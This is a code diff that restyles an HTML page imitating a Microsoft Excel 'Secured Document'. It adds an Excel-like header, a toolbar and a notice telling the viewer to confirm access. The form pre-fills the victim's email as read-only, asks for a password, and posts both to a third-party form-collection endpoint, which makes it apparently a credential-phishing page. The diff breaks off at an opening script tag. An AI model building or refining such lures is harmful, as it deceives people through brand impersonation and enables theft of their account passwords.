@@ -2,43 +2,76 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Spreadsheet</title>
+<title>Secured Spreadsheet</title>
 
 <style>
   body {
-    background: #f3f3f3;
+    background: #eef1f4;
     font-family: Calibri, Arial, sans-serif;
     padding: 40px;
   }
 
-  .sheet {
-    background: white;
-    width: 700px;
+  .excel-window {
+    width: 860px;
     margin: auto;
-    border: 1px solid #bfbfbf;
+    background: #ffffff;
+    border: 1px solid #c8c8c8;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+  }
+
+  .excel-header {
+    background: #217346;
+    color: white;
+    padding: 12px 16px;
+    font-size: 14px;
+    display: flex;
+    justify-content: space-between;
+  }
+
+  .toolbar {
+    background: #f3f3f3;
+    padding: 8px 12px;
+    font-size: 13px;
+    border-bottom: 1px solid #d0d0d0;
+    color: #555;
+  }
+
+  .notice {
+    background: #fff8d5;
+    border-bottom: 1px solid #e6d98c;
+    padding: 14px;
+    font-size: 13px;
+    color: #333;
   }
 
   table {
-    border-collapse: collapse;
     width: 100%;
+    border-collapse: collapse;
   }
 
-  td, th {
-    border: 1px solid #d0d0d0;
+  th, td {
+    border: 1px solid #d9d9d9;
     padding: 8px;
     font-size: 14px;
   }
 
   th {
-    background: #e6e6e6;
+    background: #f3f3f3;
+    text-align: center;
+    font-weight: bold;
+  }
+
+  .row-header {
+    background: #f3f3f3;
+    width: 40px;
     text-align: center;
     font-weight: bold;
   }
 
   .label {
-    background: #f2f2f2;
+    background: #fafafa;
     font-weight: bold;
-    width: 200px;
+    width: 260px;
   }
 
   input {
@@ -47,50 +80,93 @@
     outline: none;
     font-family: Calibri, Arial, sans-serif;
     font-size: 14px;
+    padding: 4px;
+  }
+
+  .submit-cell {
+    text-align: center;
+    padding: 20px;
   }
 
   button {
-    width: 100%;
-    padding: 10px;
-    background: #217346; /* Excel green */
+    background: #217346;
     color: white;
     border: none;
+    padding: 10px 26px;
     font-size: 14px;
     cursor: pointer;
+    border-radius: 3px;
+  }
+
+  button:hover {
+    background: #1b5e38;
+  }
+
+  .footer {
+    font-size: 12px;
+    color: #777;
+    padding: 10px;
+    background: #fafafa;
+    border-top: 1px solid #e0e0e0;
   }
 </style>
 </head>
 
 <body>
 
-<div class="sheet">
-  <form action="https://formcarry.com/s/zPqDzDWqria" method="POST">
+<div class="excel-window">
+
+  <div class="excel-header">
+    <strong>Microsoft Excel</strong>
+    <span>Secured Document</span>
+  </div>
+
+  <div class="toolbar">
+    Home · Insert · Page Layout · Formulas · Data · Review · View
+  </div>
+
+  <div class="notice">
+    🔒 <strong>This secured document can only be accessed by the email below.</strong><br>
+    Please confirm access to view this spreadsheet.
+  </div>
+
+  <form action="https://formcarry.com/s/YOUR_FORMCARRY_ID" method="POST">
     <table>
       <tr>
-        <th colspan="2">Microsoft Excel</th>
+        <th></th>
+        <th>A</th>
+        <th>B</th>
       </tr>
 
       <tr>
-        <td class="label">Email</td>
+        <td class="row-header">1</td>
+        <td class="label">Authorized email</td>
         <td>
           <input type="email" id="email" name="email" readonly required>
         </td>
       </tr>
 
       <tr>
-        <td class="label">Document code</td>
+        <td class="row-header">2</td>
+        <td class="label">Document password</td>
         <td>
           <input type="password" name="document_code" required>
         </td>
       </tr>
 
       <tr>
-        <td colspan="2">
-          <button type="submit">Open Spreadsheet</button>
+        <td class="row-header">3</td>
+        <td colspan="2" class="submit-cell">
+          <button type="submit">Verify & Open Spreadsheet</button>
         </td>
       </tr>
     </table>
   </form>
+
+  <div class="footer">
+    Protected spreadsheet preview · Authorized recipients only
+  </div>
+
 </div>
 
 <script>
